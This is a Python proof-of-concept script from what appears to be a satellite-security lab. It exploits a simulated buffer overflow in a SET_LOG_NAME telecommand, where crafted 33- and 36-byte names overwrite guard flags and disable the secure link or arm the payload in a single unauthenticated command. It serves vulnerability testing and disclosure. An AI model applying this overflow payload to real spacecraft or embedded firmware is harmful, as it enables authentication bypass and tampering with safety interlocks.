#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-13  SET_LOG_NAME copies the TC into a 32-byte buffer with no bound
# (OPS-SAT ADCS strcat analogue). Bytes 33..36 spill over the guard
# variables: one command flips usb_debug / secure / gs_mode / armed.
# SPARTA: AC-0004.01 (memory corruption -> auth bypass)
def main(dev, ev):
    st = dev.find(dev.tc(0x1A, b"boot-log", via="radio"), 0x1A)[0]
    ev.log(f"baseline: usb_debug={st.u8(1)} secure={st.u8(2)} gs={st.u8(3)}")
    check(st.u8(2) == 1, "secure link on baseline")
    # 33 bytes: byte 33 is the terminator -> lands on the 'secure' flag
    one_tc = b"A" * 33
    st2 = dev.find(dev.tc(0x1A, one_tc, via="radio"), 0x1A)[0]
    ev.log(f"after 33-byte name: usb_debug={st2.u8(1)} secure={st2.u8(2)}")
    check(st2.u8(2) == 0, "one TC switched the AES engine OFF")
    check(dev.sim.secure is False, "device state secure=False")
    mr = dev.find(dev.tc(0x19, struct.pack("<IH", fs.SYM_LOG_NAME, 16),
                         via="radio"), 0x19)[0]
    ev.log(f"buffer content: {mr.payload[7:].hex()} (32 'A' then spill)")
    # full flag takeover in ONE command: 36 bytes (the copy stops at the
    # first NUL, like the firmware strcat -- so write 1s then terminate)
    pay = b"B" * 32 + b"\x01\x01\x01\x01" + b"\x00"
    st3 = dev.find(dev.tc(0x1A, pay, via="radio"), 0x1A)[0]
    ev.log(f"36-byte name: usb_debug={st3.u8(1)} secure={st3.u8(2)} "
           f"gs={st3.u8(3)} armed={st3.u8(4)}")
    check((st3.u8(1), st3.u8(2), st3.u8(3)) == (1, 1, 1),
          "guard variables overwritten deterministically")
    check(dev.sim.payload_armed is True, "payload_armed guard overwritten too")
    ev.log("=> single unauthenticated TC = total protection-state rewrite")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-13 SET_LOG_NAME overflow overwrites flags", main))
